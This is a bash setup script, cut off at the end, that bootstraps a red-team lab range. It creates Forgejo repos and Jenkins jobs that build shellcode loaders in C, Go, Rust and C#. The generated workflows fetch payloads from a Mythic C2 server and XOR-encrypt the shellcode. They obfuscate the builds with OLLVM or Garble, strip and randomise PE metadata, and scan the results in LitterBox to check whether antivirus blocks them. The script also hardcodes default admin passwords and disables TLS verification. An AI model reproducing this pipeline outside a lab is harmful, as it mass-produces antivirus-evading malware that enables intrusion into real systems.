#!/usr/bin/env bash
set -euo pipefail

# --------------------------------------------------------------------------
# Labyrinth range - Forgejo + Jenkins + Daedalus bootstrap
#
# Creates organisations, repos, webhooks, Forgejo Actions workflows,
# Jenkins pipeline jobs, and the secrets Daedalus needs to trigger builds.
#
# Run from an operator workstation that can reach Forgejo and Jenkins.
# Requires: curl, jq, git
#
# Usage:
#   bash pipeline/setup.sh                    # interactive prompts
#   bash pipeline/setup.sh --non-interactive  # use env vars / defaults only
#   bash pipeline/setup.sh --clean            # delete all repos first, then recreate
# --------------------------------------------------------------------------

NON_INTERACTIVE=false
CLEAN_REPOS=false
for arg in "$@"; do
    case "$arg" in
        --non-interactive|-n) NON_INTERACTIVE=true ;;
        --clean|-c) CLEAN_REPOS=true ;;
    esac
done

# --------------------------------------------------------------------------
# Prompt helper - uses existing env var or default, asks user to confirm/edit.
# In non-interactive mode, silently accepts the env var / default.
# For secrets, pass "secret" as $4 to hide input.
# --------------------------------------------------------------------------
prompt_var() {
    local var_name="$1"
    local label="$2"
    local default_val="$3"
    local is_secret="${4:-}"

    local current="${!var_name:-$default_val}"

    if [[ "$NON_INTERACTIVE" == true ]]; then
        printf -v "$var_name" '%s' "$current"
        return
    fi

    if [[ "$is_secret" == "secret" && -n "$current" ]]; then
        local display="****${current: -4}"
    else
        local display="$current"
    fi

    if [[ -n "$display" ]]; then
        printf "  %s [%s]: " "$label" "$display"
    else
        printf "  %s: " "$label"
    fi

    if [[ "$is_secret" == "secret" ]]; then
        read -rs input
        echo ""
    else
        read -r input
    fi

    if [[ -n "$input" ]]; then
        printf -v "$var_name" '%s' "$input"
    else
        printf -v "$var_name" '%s' "$current"
    fi
}

# --------------------------------------------------------------------------
# Interactive configuration
# --------------------------------------------------------------------------
echo ""
echo "=========================================="
echo "  Labyrinth Pipeline Setup"
echo "=========================================="
echo ""

if [[ "$NON_INTERACTIVE" == false ]]; then
    echo "Configure your range. Press Enter to accept the default shown in brackets."
    echo "Set environment variables beforehand to pre-fill values."
    echo ""
fi

# --- Range second octet ---
RANGE_OCTET="${RANGE_OCTET:-}"

if [[ "$NON_INTERACTIVE" == false ]]; then
    echo "[1/5] Range network"
    echo ""
    prompt_var RANGE_OCTET "Range second octet (e.g. 5 for 10.5.x.x)" ""

    if [[ -z "$RANGE_OCTET" ]]; then
        echo ""
        echo "  ERROR: Range second octet is required."
        echo "  This is the number from your Ludus range (e.g. 5 for 10.5.x.x)."
        echo "  Find it with: ludus range list"
        exit 1
    fi
    echo ""
fi

if [[ -z "$RANGE_OCTET" ]]; then
    echo "ERROR: RANGE_OCTET must be set in non-interactive mode."
    echo "  export RANGE_OCTET=5  # your range second octet"
    exit 1
fi

# Build default URLs from the octet
_FORGEJO_DEFAULT="https://10.${RANGE_OCTET}.99.2"
_JENKINS_DEFAULT="http://10.${RANGE_OCTET}.99.3:8080"
_MYTHIC_DEFAULT="https://10.${RANGE_OCTET}.99.6:7443"
_LITTERBOX_DEFAULT="http://10.${RANGE_OCTET}.99.12:1337"

# --- Service URLs ---
FORGEJO_URL="${FORGEJO_URL:-$_FORGEJO_DEFAULT}"
JENKINS_URL="${JENKINS_URL:-$_JENKINS_DEFAULT}"
MYTHIC_URL="${MYTHIC_URL:-$_MYTHIC_DEFAULT}"
LITTERBOX_URL="${LITTERBOX_URL:-$_LITTERBOX_DEFAULT}"

if [[ "$NON_INTERACTIVE" == false ]]; then
    echo "[2/5] Service URLs"
    echo ""
    prompt_var FORGEJO_URL    "Forgejo URL"    "$_FORGEJO_DEFAULT"
    prompt_var JENKINS_URL    "Jenkins URL"    "$_JENKINS_DEFAULT"
    prompt_var MYTHIC_URL     "Mythic URL"     "$_MYTHIC_DEFAULT"
    prompt_var LITTERBOX_URL  "LitterBox URL"  "$_LITTERBOX_DEFAULT"
    echo ""
fi

# --- Credentials ---
FORGEJO_USER="${FORGEJO_USER:-forgejo-admin}"
FORGEJO_PASS="${FORGEJO_PASS:-ForgejoPW1!}"
JENKINS_USER="${JENKINS_USER:-admin}"
JENKINS_PASS="${JENKINS_PASS:-JenkinsPW1!}"

if [[ "$NON_INTERACTIVE" == false ]]; then
    echo "[3/5] Service credentials"
    echo ""
    prompt_var FORGEJO_USER  "Forgejo admin user"      "forgejo-admin"
    prompt_var FORGEJO_PASS  "Forgejo admin password"   "ForgejoPW1!"  secret
    prompt_var JENKINS_USER  "Jenkins admin user"       "admin"
    prompt_var JENKINS_PASS  "Jenkins admin password"   "JenkinsPW1!"  secret
    echo ""
fi

# --- API token ---
MYTHIC_API_TOKEN="${MYTHIC_API_TOKEN:-}"

if [[ "$NON_INTERACTIVE" == false ]]; then
    echo "[4/5] Mythic API token"
    echo "  (leave blank to skip - you can add this later via Jenkins/Forgejo UI)"
    echo ""
    prompt_var MYTHIC_API_TOKEN  "Mythic API token"     ""  secret
    echo ""
fi

# --- Webhook token ---
JENKINS_WEBHOOK_TOKEN="${JENKINS_WEBHOOK_TOKEN:-maas-build-trigger}"

if [[ "$NON_INTERACTIVE" == false ]]; then
    echo "[5/5] Jenkins webhook"
    echo ""
    prompt_var JENKINS_WEBHOOK_TOKEN  "Webhook trigger token"  "maas-build-trigger"
    echo ""
fi

# --------------------------------------------------------------------------
# Confirm before proceeding
# --------------------------------------------------------------------------
if [[ "$NON_INTERACTIVE" == false ]]; then
    echo "=========================================="
    echo "  Configuration summary"
    echo "=========================================="
    echo ""
    echo "  Range octet:  ${RANGE_OCTET}"
    echo "  Forgejo:      ${FORGEJO_URL} (${FORGEJO_USER})"
    echo "  Jenkins:      ${JENKINS_URL} (${JENKINS_USER})"
    echo "  Mythic:       ${MYTHIC_URL}"
    echo "  LitterBox:    ${LITTERBOX_URL}"
    if [[ -n "${MYTHIC_API_TOKEN}" ]]; then
        echo "  Mythic token: set"
    else
        echo "  Mythic token: not set"
    fi
    echo ""
    printf "  Proceed? [Y/n]: "
    read -r confirm
    if [[ "${confirm,,}" == "n" ]]; then
        echo "Aborted."
        exit 0
    fi
    echo ""
fi

# --------------------------------------------------------------------------
# Build curl commands
# --------------------------------------------------------------------------
CURL="curl -sk -u ${FORGEJO_USER}:${FORGEJO_PASS}"
CURL_JENKINS="curl -sk -u ${JENKINS_USER}:${JENKINS_PASS}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# --------------------------------------------------------------------------
# 0. Clean up existing Forgejo repos and orgs (only with --clean)
# --------------------------------------------------------------------------
if [[ "$CLEAN_REPOS" == true ]]; then
    echo ""
    echo "[!] WARNING: This will DELETE all repos in the 'offensive-tooling' and 'configs'"
    echo "    organisations on Forgejo (${FORGEJO_URL}) and recreate them from scratch."
    echo ""
    if [[ "$NON_INTERACTIVE" == false ]]; then
        read -r -p "    Continue? [y/N] " confirm
        if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
            echo "[-] Aborted."
            exit 1
        fi
    fi
    echo "[*] Deleting existing Forgejo repos..."
    for org in offensive-tooling configs; do
        repos=$($CURL -s "${FORGEJO_URL}/api/v1/orgs/${org}/repos?limit=50" 2>/dev/null \
            | jq -r '.[].name // empty' 2>/dev/null || true)
        if [ -n "$repos" ]; then
            while IFS= read -r repo; do
                [ -z "$repo" ] && continue
                echo "  deleting ${org}/${repo}"
                $CURL -s -X DELETE "${FORGEJO_URL}/api/v1/repos/${org}/${repo}" >/dev/null 2>&1 || true
            done <<< "$repos"
        fi
        $CURL -s -X DELETE "${FORGEJO_URL}/api/v1/orgs/${org}" >/dev/null 2>&1 || true
    done
    echo "[+] Cleanup complete"
fi

# --------------------------------------------------------------------------
# 1. Organisations
# --------------------------------------------------------------------------
echo "[*] Creating organisations..."
for org in offensive-tooling configs; do
    $CURL -X POST "${FORGEJO_URL}/api/v1/orgs" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"${org}\", \"visibility\": \"private\"}" \
        2>/dev/null || echo "  org '${org}' may already exist"
done

# --------------------------------------------------------------------------
# 2. Repos
# --------------------------------------------------------------------------
echo "[*] Creating repos..."
declare -A REPOS=(
    ["offensive-tooling/loader-c-mingw"]="C loader compiled with MinGW"
    ["offensive-tooling/loader-c-ollvm"]="C loader with Clang + OLLVM passes"
    ["offensive-tooling/loader-go-garble"]="Go loader obfuscated with Garble"
    ["offensive-tooling/loader-rust"]="Rust loader cross-compiled with MinGW"
    ["offensive-tooling/loader-csharp"]="C# loader built with .NET SDK"
    ["configs/pipeline-configs"]="YAML pipeline configurations and build profiles"
)

for repo_path in "${!REPOS[@]}"; do
    IFS='/' read -r org repo <<< "${repo_path}"
    desc="${REPOS[$repo_path]}"

    $CURL -X POST "${FORGEJO_URL}/api/v1/orgs/${org}/repos" \
        -H "Content-Type: application/json" \
        -d "{\"name\": \"${repo}\", \"description\": \"${desc}\", \"private\": true, \"auto_init\": true}" \
        2>/dev/null || echo "  repo '${repo_path}' may already exist"
done

# --------------------------------------------------------------------------
# 3. Jenkins webhooks (generic-webhook-trigger on push)
# --------------------------------------------------------------------------
echo "[*] Configuring webhooks for Jenkins..."
for repo_path in "${!REPOS[@]}"; do
    IFS='/' read -r org repo <<< "${repo_path}"
    [[ "$org" == "configs" ]] && continue

    $CURL -X POST "${FORGEJO_URL}/api/v1/repos/${org}/${repo}/hooks" \
        -H "Content-Type: application/json" \
        -d "{
            \"type\": \"forgejo\",
            \"active\": true,
            \"config\": {
                \"url\": \"${JENKINS_URL}/generic-webhook-trigger/invoke?token=${JENKINS_WEBHOOK_TOKEN}\",
                \"content_type\": \"json\",
                \"secret\": \"\"
            },
            \"events\": [\"push\"]
        }" 2>/dev/null || echo "  webhook for '${repo_path}' may already exist"
done

# --------------------------------------------------------------------------
# 4. Forgejo API token for Daedalus
# --------------------------------------------------------------------------
echo "[*] Creating Forgejo API token for Daedalus..."
DAEDALUS_TOKEN=$($CURL -s -X POST "${FORGEJO_URL}/api/v1/users/${FORGEJO_USER}/tokens" \
    -H "Content-Type: application/json" \
    -d '{"name": "daedalus", "scopes": ["all"]}' \
    | jq -r '.sha1 // empty') || true

if [[ -z "${DAEDALUS_TOKEN:-}" ]]; then
    echo "  token 'daedalus' may already exist - reusing existing token"
    echo "  (set DAEDALUS_FORGEJO_TOKEN env var if you already have one)"
    DAEDALUS_TOKEN="${DAEDALUS_FORGEJO_TOKEN:-}"
fi

# --------------------------------------------------------------------------
# 5. Enable Forgejo Actions on build repos
# --------------------------------------------------------------------------
echo "[*] Enabling Forgejo Actions on build repos..."
for repo_path in "${!REPOS[@]}"; do
    IFS='/' read -r org repo <<< "${repo_path}"
    [[ "$org" == "configs" ]] && continue

    $CURL -s -X PATCH "${FORGEJO_URL}/api/v1/repos/${org}/${repo}" \
        -H "Content-Type: application/json" \
        -d '{"has_actions": true}' \
        >/dev/null 2>&1 || echo "  could not enable actions on '${repo_path}'"
done

# --------------------------------------------------------------------------
# 6. Forgejo Actions secrets (for Daedalus workflow_dispatch builds)
# --------------------------------------------------------------------------
echo "[*] Setting Forgejo Actions secrets..."
set_forgejo_secret() {
    local org="$1" repo="$2" name="$3" value="$4"
    $CURL -s -X PUT "${FORGEJO_URL}/api/v1/repos/${org}/${repo}/actions/secrets/${name}" \
        -H "Content-Type: application/json" \
        -d "{\"data\": \"${value}\"}" \
        >/dev/null 2>&1 || echo "  could not set secret '${name}' on '${org}/${repo}'"
}

for repo_path in "${!REPOS[@]}"; do
    IFS='/' read -r org repo <<< "${repo_path}"
    [[ "$org" == "configs" ]] && continue

    if [[ -n "${MYTHIC_URL}" ]]; then
        set_forgejo_secret "$org" "$repo" "MYTHIC_URL"   "$MYTHIC_URL"
    fi
    if [[ -n "${MYTHIC_API_TOKEN}" ]]; then
        set_forgejo_secret "$org" "$repo" "MYTHIC_TOKEN"  "$MYTHIC_API_TOKEN"
    fi
    if [[ -n "${LITTERBOX_URL}" ]]; then
        set_forgejo_secret "$org" "$repo" "LITTERBOX_URL"   "$LITTERBOX_URL"
    fi
done

# --------------------------------------------------------------------------
# 7. Push Forgejo Actions workflow + Jenkinsfile into each build repo
# --------------------------------------------------------------------------
echo "[*] Pushing pipeline files into repos..."

FORGEJO_GIT_URL="${FORGEJO_URL/https:\/\//https://${FORGEJO_USER}:${FORGEJO_PASS}@}"

# Daedalus Forgejo workflow - per-language build commands from Labyrinth
generate_forgejo_workflow() {
    local language="$1"
    cat <<'WORKFLOW_HEADER'
name: Daedalus Build

on:
  workflow_dispatch:
    inputs:
      LANGUAGE:
        description: "Build language/toolchain"
        type: string
        required: false
      OUTPUT_FORMAT:
        description: "Output format (exe, dll, shellcode)"
        type: string
        required: false
        default: "exe"
      OBFUSCATION:
        description: "Obfuscation profile"
        type: string
        required: false
        default: "none"
      SHELLCODE_SOURCE:
        description: "Mythic payload ref (mythic:<uuid>)"
        type: string
        required: false
        default: ""
      SHELLCODE_FILE:
        description: "Path to shellcode file in repo"
        type: string
        required: false
        default: "shellcode/payload.bin"
      PE_SANITISE:
        description: "Strip PE metadata post-build"
        type: boolean
        required: false
        default: true
      LITTERBOX_SCAN:
        description: "Submit to LitterBox after build"
        type: boolean
        required: false
        default: true
      SCAN_TYPE:
        description: "LitterBox scan profile"
        type: string
        required: false
        default: "all"

env:
  SHELLCRYPT: /opt/shellcrypt/main.py

jobs:
  build:
    runs-on: [self-hosted, maas]

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Fetch payload from Mythic
        if: startsWith(inputs.SHELLCODE_SOURCE, 'mythic:')
        run: |
          mkdir -p shellcode
          UUID="${{ inputs.SHELLCODE_SOURCE }}"
          UUID="${UUID#mythic:}"
          curl -sk -H "apitoken: ${{ secrets.MYTHIC_TOKEN }}" \
            "${{ secrets.MYTHIC_URL }}/api/v1.4/payloads/download/${UUID}" \
            -o "${{ inputs.SHELLCODE_FILE }}"
          ls -la "${{ inputs.SHELLCODE_FILE }}"

      - name: Validate shellcode
        run: |
          if [ -n "${{ inputs.SHELLCODE_SOURCE }}" ] || [ -f "${{ inputs.SHELLCODE_FILE }}" ]; then
            test -f "${{ inputs.SHELLCODE_FILE }}" || { echo "[-] No shellcode"; exit 1; }
          fi

WORKFLOW_HEADER

    cat <<'ENCRYPT_BLOCK'
      - name: Encrypt shellcode
        run: |
          mkdir -p shellcode
          [ -f shellcode/payload.bin ] || printf '\xcc' > shellcode/payload.bin
          XOR_KEY=$(python3 -c "import os; print(os.urandom(32).hex())")

          # C format
          python3 ${SHELLCRYPT} \
            -i shellcode/payload.bin -e xor \
            -k "$XOR_KEY" -f c -a shellcode \
            -o shellcode/shellcode.h

          # Go format
          python3 ${SHELLCRYPT} \
            -i shellcode/payload.bin -e xor \
            -k "$XOR_KEY" -f go -a shellcode \
            -o shellcode/shellcode.go
          sed -i '1i\package main' shellcode/shellcode.go

          # Rust format
          python3 ${SHELLCRYPT} \
            -i shellcode/payload.bin -e xor \
            -k "$XOR_KEY" -f rust -a shellcode \
            -o shellcode/shellcode.rs
          sed -i 's/^let /pub static /' shellcode/shellcode.rs
          expand -t4 shellcode/shellcode.rs > shellcode/shellcode.rs.tmp \
            && mv shellcode/shellcode.rs.tmp shellcode/shellcode.rs

          # C# format
          python3 ${SHELLCRYPT} \
            -i shellcode/payload.bin -e xor \
            -k "$XOR_KEY" -f csharp -a shellcode \
            -o shellcode/Shellcode.cs
          sed -i '1i\static class SC {' shellcode/Shellcode.cs
          echo "}" >> shellcode/Shellcode.cs
          sed -i 's/^byte\[\]/    internal static byte[]/' shellcode/Shellcode.cs

          echo "[+] Shellcode encrypted with Shellcrypt (key: 32 bytes)"

ENCRYPT_BLOCK

    case "$language" in
        c-mingw)
            cat <<'BUILD_BLOCK'
      - name: Build
        run: |
          mkdir -p build
          cp shellcode/shellcode.h src/shellcode.h
          FMT="${{ inputs.OUTPUT_FORMAT }}"
          if [ "$FMT" = "dll" ]; then
            x86_64-w64-mingw32-gcc -o build/loader.dll \
              src/main.c src/payload.c src/techniques/*.c \
              -Isrc -shared -lntdll -lkernel32 -mwindows -s -O2
          else
            x86_64-w64-mingw32-gcc -o build/loader.exe \
              src/main.c src/payload.c src/techniques/*.c \
              -Isrc -lntdll -lkernel32 -mwindows -s -O2
          fi

BUILD_BLOCK
            ;;
        c-ollvm)
            cat <<'BUILD_BLOCK'
      - name: Build
        run: |
          mkdir -p build
          cp shellcode/shellcode.h src/shellcode.h
          PLUGIN="/opt/ollvm/lib/libOLLVMPipeline.so"
          OLLVM_FLAGS=""
          OBF="${{ inputs.OBFUSCATION }}"
          if [ -f "$PLUGIN" ] && echo "$OBF" | grep -q '^ollvm'; then
            OLLVM_FLAGS="-fpass-plugin=$PLUGIN"
          fi
          clang --target=x86_64-w64-mingw32 $OLLVM_FLAGS \
            -c src/main.c src/payload.c src/ntapi.c src/techniques/*.c -Isrc -O1
          FMT="${{ inputs.OUTPUT_FORMAT }}"
          if [ "$FMT" = "dll" ]; then
            x86_64-w64-mingw32-gcc -o build/loader.dll \
              *.o -shared -lntdll -lkernel32 -s
          else
            x86_64-w64-mingw32-gcc -o build/loader.exe \
              *.o -lntdll -lkernel32 -s
          fi

BUILD_BLOCK
            ;;
        go-garble)
            cat <<'BUILD_BLOCK'
      - name: Build
        run: |
          mkdir -p build
          cp shellcode/shellcode.go cmd/loader/shellcode.go
          GOOS=windows GOARCH=amd64 \
          garble -literals -tiny build \
            -o build/loader.exe -ldflags="-s -w" \
            ./cmd/loader

BUILD_BLOCK
            ;;
        rust)
            cat <<'BUILD_BLOCK'
      - name: Build
        run: |
          mkdir -p build
          cp shellcode/shellcode.rs src/shellcode.rs
          cargo build --release --target x86_64-pc-windows-gnu
          cp target/x86_64-pc-windows-gnu/release/loader.exe build/loader.exe

BUILD_BLOCK
            ;;
        csharp)
            cat <<'BUILD_BLOCK'
      - name: Build
        run: |
          mkdir -p build
          cp shellcode/Shellcode.cs src/Shellcode.cs
          dotnet publish src/Loader.csproj \
            -c Release -r win-x64 \
            --self-contained true \
            -p:PublishSingleFile=true \
            -p:PublishTrimmed=true \
            -o build/

BUILD_BLOCK
            ;;
    esac

    cat <<'WORKFLOW_FOOTER'
      - name: PE Sanitisation
        if: inputs.PE_SANITISE == 'true'
        run: |
          if command -v python3 &>/dev/null && [ -f tools/pe-sanitise.py ]; then
            python3 tools/pe-sanitise.py build/loader.* \
              --strip-rich --randomise-timestamp --strip-debug --strip-version-info
          fi

      - name: Checksum
        run: |
          cd build && sha256sum loader.* > checksums.sha256

      - name: LitterBox Scan
        if: inputs.LITTERBOX_SCAN == 'true'
        run: |
          LB="${{ secrets.LITTERBOX_URL }}"
          FILE=$(ls build/loader.* | head -1)
          MD5=$(curl -sf -X POST "${LB}/upload" \
            -F "file=@${FILE};type=application/octet-stream" | jq -r '.file_info.md5')
          [ -n "$MD5" ] && [ "$MD5" != "null" ] || { echo "[-] Upload failed"; exit 0; }
          echo "[+] Uploaded - MD5: ${MD5}"
          SCAN="${{ inputs.SCAN_TYPE }}"
          case "$SCAN" in
            static)  curl -sf -X POST "${LB}/analyze/static/${MD5}" > /dev/null; sleep 3 ;;
            dynamic) curl -sf -X POST "${LB}/analyze/dynamic/${MD5}" > /dev/null
                     for i in $(seq 1 30); do
                       S=$(curl -sf "${LB}/api/results/dynamic/${MD5}" | jq -r '.status // empty')
                       case "$S" in completed|blocked_by_av|partial|error|"") break ;; esac
                       sleep 5
                     done ;;
            all)     curl -sf -X POST "${LB}/analyze/static/${MD5}" > /dev/null
                     curl -sf -X POST "${LB}/analyze/dynamic/${MD5}" > /dev/null
                     sleep 3
                     for i in $(seq 1 30); do
                       S=$(curl -sf "${LB}/api/results/dynamic/${MD5}" | jq -r '.status // empty')
                       case "$S" in completed|blocked_by_av|partial|error|"") break ;; esac
                       sleep 5
                     done ;;
          esac
          curl -sf "${LB}/api/results/risk/${MD5}" | jq . > build/scan-results.json || true
          echo "[+] Results: ${LB}/results/info/${MD5}"

      - name: Upload artifact
        uses: actions/upload-artifact@v3
        with:
          name: build-${{ github.run_id }}
          path: build/
WORKFLOW_FOOTER
}

# Map repo name to the language used in its workflow
repo_language() {
    case "$1" in
        loader-c-mingw)  echo "c-mingw" ;;
        loader-c-ollvm)  echo "c-ollvm" ;;
        loader-go-garble) echo "go-garble" ;;
        loader-rust)      echo "rust" ;;
        loader-csharp)    echo "csharp" ;;
        *)                echo "" ;;
    esac
}

TMPDIR="$(mktemp -d)"
JENKINS_COOKIE_JAR="$(mktemp)"
trap 'rm -rf "$TMPDIR" "$JENKINS_COOKIE_JAR"' EXIT

for repo_path in "${!REPOS[@]}"; do
    IFS='/' read -r org repo <<< "${repo_path}"
    [[ "$org" == "configs" ]] && continue

    lang=$(repo_language "$repo")
    [[ -z "$lang" ]] && continue

    echo "  -> ${org}/${repo} (${lang})"

    REPO_DIR="${TMPDIR}/${repo}"
    GIT_SSL_NO_VERIFY=true git clone -q "${FORGEJO_GIT_URL}/${org}/${repo}.git" "$REPO_DIR" 2>/dev/null || {
        echo "    clone failed - skipping"
        continue
    }

    pushd "$REPO_DIR" >/dev/null

    # Forgejo Actions workflow
    mkdir -p .forgejo/workflows
    generate_forgejo_workflow "$lang" > .forgejo/workflows/build.yml

    # Jenkinsfile (copy from pipeline/)
    if [[ -f "${SCRIPT_DIR}/Jenkinsfile" ]]; then
        cp "${SCRIPT_DIR}/Jenkinsfile" Jenkinsfile
    fi

    # PE sanitisation tool (legacy path used by some stages)
    if [[ -f "${SCRIPT_DIR}/tools/pe-sanitise.py" ]]; then
        mkdir -p tools
        cp "${SCRIPT_DIR}/tools/pe-sanitise.py" tools/pe-sanitise.py
    fi

    # Pipeline tools used by Jenkinsfile stages (pipeline/tools/ path)
    mkdir -p pipeline/tools
    for tool in pe-sanitise.py payload-version.py deconflict-tag.py signing-profiles.yml; do
        if [[ -f "${SCRIPT_DIR}/tools/${tool}" ]]; then
            cp "${SCRIPT_DIR}/tools/${tool}" "pipeline/tools/${tool}"
        fi
    done

    # Build profiles
    if [[ -f "${SCRIPT_DIR}/build-profiles.yml" ]]; then
        cp "${SCRIPT_DIR}/build-profiles.yml" build-profiles.yml
    fi

    # Source layout + example loaders
    mkdir -p shellcode
    LOADER_DIR="${SCRIPT_DIR}/../loaders/${repo}"
    if [[ "$lang" == "go-garble" ]]; then
        cp "$LOADER_DIR/go.mod" . 2>/dev/null || true
        cp -r "$LOADER_DIR"/cmd . 2>/dev/null || true
        cp -r "$LOADER_DIR"/internal . 2>/dev/null || true
    elif [[ "$lang" == "rust" ]]; then
        cp "$LOADER_DIR/Cargo.toml" . 2>/dev/null || true
        cp -r "$LOADER_DIR"/.cargo . 2>/dev/null || true
        mkdir -p src
        cp -r "$LOADER_DIR"/src/* src/ 2>/dev/null || true
    elif [[ -d "$LOADER_DIR/src" ]]; then
        mkdir -p src
        cp -r "$LOADER_DIR"/src/* src/ 2>/dev/null || true
    else
        mkdir -p src
        [[ -f src/.gitkeep ]] || touch src/.gitkeep
    fi
    [[ -f shellcode/.gitkeep ]] || touch shellcode/.gitkeep

    git add -A
    if ! git diff --cached --quiet; then
        GIT_SSL_NO_VERIFY=true git \
            -c user.name="Labyrinth Setup" \
            -c user.email="setup@labyrinth.range" \
            commit -q -m "Add Daedalus workflows, Jenkinsfile, and pipeline tooling"
        GIT_SSL_NO_VERIFY=true git push -q origin main 2>/dev/null || echo "    push failed"
    else
        echo "    already up to date"
    fi

    popd >/dev/null
done

# Push build profiles into configs/pipeline-configs
echo "  -> configs/pipeline-configs"
CONFIGS_DIR="${TMPDIR}/pipeline-configs"
GIT_SSL_NO_VERIFY=true git clone -q "${FORGEJO_GIT_URL}/configs/pipeline-configs.git" "$CONFIGS_DIR" 2>/dev/null || true
if [[ -d "$CONFIGS_DIR" ]]; then
    pushd "$CONFIGS_DIR" >/dev/null
    [[ -f "${SCRIPT_DIR}/build-profiles.yml" ]] && cp "${SCRIPT_DIR}/build-profiles.yml" build-profiles.yml
    git add -A
    if ! git diff --cached --quiet; then
        GIT_SSL_NO_VERIFY=true git \
            -c user.name="Labyrinth Setup" \
            -c user.email="setup@labyrinth.range" \
            commit -q -m "Add build profiles"
        GIT_SSL_NO_VERIFY=true git push -q origin main 2>/dev/null || echo "    push failed"
    fi
    popd >/dev/null
fi

# --------------------------------------------------------------------------
# 8. Jenkins pipeline jobs (one per build repo)
#    Jenkins crumbs are session-bound - the JSESSIONID cookie from the crumb
#    request must be sent with every subsequent POST.
# --------------------------------------------------------------------------
echo "[*] Creating Jenkins pipeline jobs..."

jenkins_crumb() {
    curl -sk -u "${JENKINS_USER}:${JENKINS_PASS}" \
        -c "$JENKINS_COOKIE_JAR" \
        "${JENKINS_URL}/crumbIssuer/api/json" \
        | jq -r '.crumb // empty' 2>/dev/null || echo ""
}

CRUMB=$(jenkins_crumb)
if [[ -z "$CRUMB" ]]; then
    echo "  WARNING: could not fetch Jenkins crumb - job/credential creation may fail"
fi

jenkins_post() {
    curl -sk -u "${JENKINS_USER}:${JENKINS_PASS}" \
        -b "$JENKINS_COOKIE_JAR" \
        -H "Jenkins-Crumb: ${CRUMB}" \
        "$@"
}

create_jenkins_job() {
    local job_name="$1" org="$2" repo="$3"

    local config_xml
    config_xml=$(cat <<JOBXML
<?xml version='1.1' encoding='UTF-8'?>
<flow-definition plugin="workflow-job">
  <actions/>
  <description>Daedalus/Labyrinth build pipeline for ${org}/${repo}</description>
  <keepDependencies>false</keepDependencies>
  <properties>
    <org.jenkinsci.plugins.workflow.job.properties.PipelineTriggersJobProperty>
      <triggers>
        <org.jenkinsci.plugins.gwt.GenericTrigger plugin="generic-webhook-trigger">
          <spec/>
          <token>${JENKINS_WEBHOOK_TOKEN}</token>
          <printContributedVariables>false</printContributedVariables>
          <printPostContent>false</printPostContent>
          <causeString>Forgejo push to ${org}/${repo}</causeString>
        </org.jenkinsci.plugins.gwt.GenericTrigger>
      </triggers>
    </org.jenkinsci.plugins.workflow.job.properties.PipelineTriggersJobProperty>
  </properties>
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsScmFlowDefinition" plugin="workflow-cps">
    <scm class="hudson.plugins.git.GitSCM" plugin="git">
      <configVersion>2</configVersion>
      <userRemoteConfigs>
        <hudson.plugins.git.UserRemoteConfig>
          <url>${FORGEJO_URL}/${org}/${repo}.git</url>
          <credentialsId>forgejo-git</credentialsId>
        </hudson.plugins.git.UserRemoteConfig>
      </userRemoteConfigs>
      <branches>
        <hudson.plugins.git.BranchSpec>
          <name>**</name>
        </hudson.plugins.git.BranchSpec>
      </branches>
      <extensions>
        <hudson.plugins.git.extensions.impl.GitClientDisableSSLVerification/>
      </extensions>
    </scm>
    <scriptPath>Jenkinsfile</scriptPath>
    <lightweight>true</lightweight>
  </definition>
  <disabled>false</disabled>
</flow-definition>
JOBXML
    )

    local http_code
    http_code=$(jenkins_post -s -o /dev/null -w "%{http_code}" \
        -X POST "${JENKINS_URL}/createItem?name=${job_name}" \
        -H "Content-Type: application/xml" \
        -d "${config_xml}")

    case "$http_code" in
        200) echo "  created '${job_name}'" ;;
        400) echo "  job '${job_name}' already exists" ;;
        *)   echo "  WARNING: job '${job_name}' returned HTTP ${http_code}" ;;
    esac
}

for repo_path in "${!REPOS[@]}"; do
    IFS='/' read -r org repo <<< "${repo_path}"
    [[ "$org" == "configs" ]] && continue

    create_jenkins_job "$repo" "$org" "$repo"
done

# --------------------------------------------------------------------------
# 9. Jenkins credentials
# --------------------------------------------------------------------------
echo "[*] Configuring Jenkins credentials..."

add_jenkins_credential() {
    local cred_xml="$1" cred_id="$2"

    local http_code
    http_code=$(jenkins_post -s -o /dev/null -w "%{http_code}" \
        -X POST "${JENKINS_URL}/credentials/store/system/domain/_/createCredentials" \
        -H "Content-Type: application/xml" \
        -d "${cred_xml}")

    case "$http_code" in
        200) echo "  created credential '${cred_id}'" ;;
        409) echo "  credential '${cred_id}' already exists" ;;
        *)   echo "  WARNING: credential '${cred_id}' returned HTTP ${http_code}" ;;
    esac
}

# Forgejo Git credential (used by pipeline SCM checkout)
FORGEJO_GIT_CRED=$(cat <<CREDXML
<com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
  <scope>GLOBAL</scope>
  <id>forgejo-git</id>
  <description>Forgejo Git access for pipeline checkout</description>
  <username>${FORGEJO_USER}</username>
  <password>${FORGEJO_PASS}</password>
</com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
CREDXML
)
add_jenkins_credential "$FORGEJO_GIT_CRED" "forgejo-git"

# Secret text credentials
add_jenkins_secret_text() {
    local cred_id="$1" cred_secret="$2" cred_desc="$3"
    [[ -z "$cred_secret" ]] && return

    local cred_xml
    cred_xml=$(cat <<CREDXML
<org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl>
  <scope>GLOBAL</scope>
  <id>${cred_id}</id>
  <description>${cred_desc}</description>
  <secret>${cred_secret}</secret>
</org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl>
CREDXML
    )
    add_jenkins_credential "$cred_xml" "$cred_id"
}

add_jenkins_secret_text "mythic-url"       "$MYTHIC_URL"       "Mythic server URL"
add_jenkins_secret_text "mythic-api-token"  "$MYTHIC_API_TOKEN" "Mythic API token"
add_jenkins_secret_text "litterbox-url"     "$LITTERBOX_URL"    "LitterBox scanner URL"

# --------------------------------------------------------------------------
# 10. Disable Git SSL verification in Jenkins (Forgejo uses self-signed cert)
# --------------------------------------------------------------------------
echo "[*] Disabling Git SSL verification in Jenkins..."

# Set GIT_SSL_NO_VERIFY globally AND run git config --global to cover the
# lightweight SCM checkout (which uses the system git, not the Jenkins env).
http_code=$(jenkins_post -s -o /dev/null -w "%{http_code}" \
    -X POST "${JENKINS_URL}/scriptText" \
    --data-urlencode "script=import jenkins.model.Jenkins
def instance = Jenkins.getInstance()
